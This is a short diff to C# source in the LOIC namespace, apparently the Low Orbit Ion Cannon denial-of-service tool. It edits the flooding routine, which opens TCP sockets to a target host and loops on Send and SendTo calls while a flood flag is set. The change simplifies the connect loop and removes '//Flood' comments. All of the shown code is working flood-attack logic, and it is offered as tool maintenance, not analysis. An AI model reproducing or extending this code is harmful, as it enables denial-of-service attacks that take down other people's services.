@@ -56,17 +56,13 @@ namespace LOIC
 						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 						socket.NoDelay = true;
 
-						while (IsFlooding) //Connect
-						{					
-							try { socket.Connect(RHost); }
-							catch { continue; }
-							break;
-						}
-					
+						try { socket.Connect(RHost); }
+						catch { continue; }
+
 						socket.Blocking = Resp;
 						try
 						{
-							while (IsFlooding) //Flood
+							while (IsFlooding)
 							{
 								FloodCount++;
 								socket.Send(buf);
@@ -81,7 +77,7 @@ namespace LOIC
 						socket.Blocking = Resp;
 						try
 						{
-							while (IsFlooding) //Flood
+							while (IsFlooding)
 							{
 								FloodCount++;
 								socket.SendTo(buf, SocketFlags.None, RHost);
